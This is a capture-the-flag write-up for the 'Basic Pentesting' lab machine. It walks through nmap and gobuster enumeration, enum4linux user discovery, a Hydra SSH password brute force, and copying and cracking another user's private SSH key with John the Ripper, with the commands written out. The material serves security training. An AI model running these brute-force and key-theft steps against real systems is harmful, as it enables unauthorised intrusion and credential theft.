# Basic Pentesting

This is the write-up for the challenge Basic Pentesting.
It provides a server that has to be deployed and then the tasks can be done.

## Tasks

### Task 1 - Web App Testing and Privilege Escalation

First we need to find the services on the machine. That can be done with **Nmap**:
```markdown
nmap -sC -sV -o nmap/basic_pentesting.nmap [IP address]
```

Open ports:
- 22 (SSH)
- 80 (HTTP)
- 139 (NetBIOS)
- 445 (SMB)
- 8009 (AJP13)
- 8080 (HTTP)

Now lets look for the hidden directory on the web server on port 80 with **Gobuster**:
```markdown
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [IP address]
```

This finds the directory _/development_ where it exposes two files.
One of the files says that the _/etc/shadow_ file got audited by _"K"_ and the password of _"J"_ was easily cracked.

Lets use **enum4linux** to find out usernames:
```markdown
enum4linux [IP address]
```

This enumerates the usernames _kay_ and _jan_ so we can use a Brute-Force attack to guess the password of _jan_ with **Hydra**:
```markdown
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.151.166
```

After a while the password is found and it is possible to login via SSH.

On the box we can access the home folder of _kay_ and there we can copy the private key from _/home/kay/.ssh/_ to escalate the privileges.
This key is password protected that can be cracked with **JohnTheRipper**.
```markdown
ssh2john.py id_rsa > id_rsa.john

john id_rsa.john --wordlist=/usr/share/wordlist/rockyou.txt
```

After a while it finds the password for the SSH key and logging in works:
```markdown
ssh -i id_rsa kay@[IP address]
```

In the home directory of _kay_ is a file with a really long password in clear-text.
